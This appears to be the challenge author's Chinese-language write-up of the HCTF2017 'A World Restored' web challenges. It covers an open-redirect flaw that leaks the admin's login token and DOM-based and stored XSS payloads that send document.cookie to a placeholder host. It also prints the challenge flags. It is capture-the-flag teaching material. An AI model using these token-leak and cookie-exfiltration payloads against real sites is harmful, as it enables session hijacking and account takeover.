---
title: HCTF2017-A World Restored-Writeup
date: 2017-11-15 17:30:45
tags:
- xss
---


```
A World Restored
Description:
nothing here or all the here ps:flag in admin cookie 
flag is login as admin
URL http://messbox.2017.hctf.io
Now Score 674.44
Team solved 7
```

```
A World Restored Again
Description: 
New Challenge !! 
hint: flag only from admin bot
URL http://messbox.2017.hctf.io
Now Score 702.6
Team solved 6
```
题目源码如下：
[https://github.com/LoRexxar/HCTF2017-A-World-Restored](https://github.com/LoRexxar/HCTF2017-A-World-Restored)

<!--more-->

A World Restored在出题思路本身是来自于uber在10月14号公开的一个漏洞[https://stamone-bug-bounty.blogspot.jp/2017/10/dom-xss-auth_14.html](https://stamone-bug-bounty.blogspot.jp/2017/10/dom-xss-auth_14.html)，为了能尽可能的模拟真实环境，我这个不专业的Web开发只能强行上手实现站库分离。

其中的一部分非预期，也都是因为站库分离实现的不好而导致的。（更开放的题目环境，导致了很多可能，或许这没什么不好的？

整个站的结构是这样的：
1、auth站负责用户数据的处理，包括登陆验证、注册等，是数据库所在站。
2、messbox站负责用户的各种操作，但不连接数据库。

这里auth站与messbox站属于两个完全不同的域，受到**同源策略**的影响，我们就需要有办法来沟通两个站。

而这里，我选择使用token做用户登陆的校验+jsonp来获取用户数据。站点结构如下:

![image.png-37.7kB][1]

简单来说就是，messbox登陆账号完全受到token校验，即使你在完全不知道账号密码的情况下，获取该token就可以登陆账号。

那么怎么获取token登陆admin账号就是第一题。

而第二题，漏洞点就是上面文章中写的那样，反射性的domxss，可以得到服务端的flag。

为了两个flag互不干扰，我对服务端做了一定的处理，服务端负责处理flag的代码如下：
```
$flag1 = "hctf{xs5_iz_re4lly_complex34e29f}";
$flag2 = "hctf{mayb3_m0re_way_iz_best_for_ctf}";

if(!empty($_SESSION['user'])){
	if($_SESSION['user'] === 'hctf_admin_LoRexxar2e23322'){
                setcookie("flag", $flag, time()+3600*48," ","messbox.2017.hctf.io", 0, true);
        }

	if($_SESSION['user'] === 'hctf_admin_LoRexxar2e23322' && $_GET['check']=="233e"){
		setcookie("flag2", $flag2, time()+3600*48," ",".2017.hctf.io");
	}
}
```

可以很明显的看出来，flag1是httponly并在messbox域下，只能登陆才能查看。flag2我设置了check位，只有bot才会访问这个页面，这样只有通过反射性xss，才能得到flag。

下面我们回到题目。

# A World Restored #

```
A World Restored
Description:
nothing here or all the here ps:flag in admin cookie 
flag is login as admin
URL http://messbox.2017.hctf.io
Now Score 674.44
Team solved 7
```

这道题目在比赛结束时，只有7只队伍最终完成了，非常出乎我的意料，因为漏洞本身非常有意思。（这个漏洞是ROIS发现的）

为了能够实现token，我设定了token不可逆的二重验证策略，但是在题目中我加入了一个特殊的接口，让我们回顾一下。

auth域中的login.php，我加入了这样一段代码

```
if(!empty($_GET['n_url'])){
		$n_url = trim($_GET['n_url']);
		echo "<script nonce='{$random}'>window.location.href='".$n_url."?token=".$usertoken."'</script>";
		exit;
	}else{
		// header("location: http://messbox.hctf.com?token=".$usertoken);
		echo "<script nonce='{$random}'>window.location.href='http://messbox.2017.hctf.io?token=".$usertoken."'</script>";
		exit;
	}
```

这段代码也是两个漏洞的核心漏洞点，假设你在未登录状态下访问messbox域下的user.php或者report.php这两个页面，那么因为未登录，页面会跳转到auth域并携带n_url，如果获取到登陆状态，这里就会拼接token传回messbox域，并赋予登陆状态。

简单的流程如下：
```
未登录->获取当前URL->跳转至auth->获取登陆状态->携带token跳转到刚才获取的URL->messbox登陆成功
```

当然，这其中是有漏洞的。

服务端bot必然登陆了admin账号，如果我们直接请求login.php并制定下一步跳转的URL，那么我们就可以获取拼接上的token！

```
poc

http://auth.2017.hctf.io/login.php?n_url=http://{you_website}
```

得到token我们就可以登陆messbox域，成功登陆admin


# A World Restored Again #

```
A World Restored Again
Description: 
New Challenge !! 
hint: flag only from admin bot
URL http://messbox.2017.hctf.io
Now Score 702.6
Team solved 6
```

到了第二部，自然就是xss了，其实题目本身非常简单，在出题之初，为了避免题目出现“垃圾时间”（因为非预期导致题目不可解），我在题目中加入了跟多元素。

并把flag2放置在`.2017.hctf.io`域下，避免有人找到messbox的xss但是打不到flag的问题。（没想到真的用上了）

这里我就简单描述下预期解法和非预期解法两个。

## 预期解法 ##

预期解法当然来自于出题思路。

[https://stamone-bug-bounty.blogspot.jp/2017/10/dom-xss-auth_14.html](https://stamone-bug-bounty.blogspot.jp/2017/10/dom-xss-auth_14.html)

漏洞本身非常简单，但有意思的是利用思路。

**当你发现了一个任意URL跳转的漏洞，会不会考虑漏洞是怎么发生的？**

也许你平时可能没注意过，但跳转一般是分两种的，第一种是服务端做的，利用`header: location`,这种跳转我们没办法阻止。第二种是js使用`location.href`导致的跳转。

既然是js实现的，那么是不是有可能存在dom xss漏洞呢？

这个uber的漏洞由来就是如此。

这里唯一的考点就是，js是一种顺序执行的语言，如果location报错，那么就不会继续执行后面的js，如果location不报错，那么就可能在执行下一句之前跳转走。

当然，办法很多。最普通的可能是在location后使用`stop()`来阻止跳转，但最好用的就是新建script块，这样上一个script报错不会影响到下一个script块。

最终payload
```
</script><script src="http://auth.hctf.com/getmessage.php?callback=window.location.href='http://xxx?cookie='+document.cookie;//"></script

exp

http://auth.2017.hctf.io/login.php?n_url=%3E%3C%2fscript%3E%3Cscript%20src%3D%22http%3A%2f%2fauth.2017.hctf.io%2fgetmessage.php%3Fcallback%3Dwindow.location.href%3D%27http%3A%2f%2fxxx%3Fcookie%3D%27%252bdocument.cookie%3B%2f%2f%22%3E%3C%2fscript%3E
```

## 非预期解法 ##

除了上面的漏洞以外，messbox也有漏洞，username在首页没有经过任何过滤就显示在了页面内。

但username这里漏洞会有一些问题，因为本身预期的漏洞点并不是这里，所以这里的username经过我框架本身的一点儿过滤，而且长度有限制，所以从这里利用的人会遇到很多非预期的问题。

payload如下，注册名为
```
<script src=//auth.2017.hctf.io/getmessage.php?callback=location=%27http://xxx/%27%2bbtoa(document.cookie);//></script>
```
的用户名，并获取token。

传递
```
http://messbox.2017.hctf.io/?token=NDYyMGZlMTNhNWM3YTAxY3xQSE5qY21sd2RDQnpjb
U05THk5aGRYUm9Makl3TVRjdWFHTjBaaTVwYnk5blpYUnRaWE56WVdkbExuQm9jRDlqWVd4c1ltR
mphejFzYjJOaGRHbHZiajBsTWpkb2RIUndPaTh2Y205dmRHc3VjSGN2SlRJM0pUSmlZblJ2WVNoa
2IyTjFiV1Z1ZEM1amIyOXJhV1VwT3k4dlBqd3ZjMk55YVhCMFBnPT0=
```
即可


  [1]: http://static.zybuluo.com/LoRexxar/bp6f3b81h84qt19qc00ws80q/image.png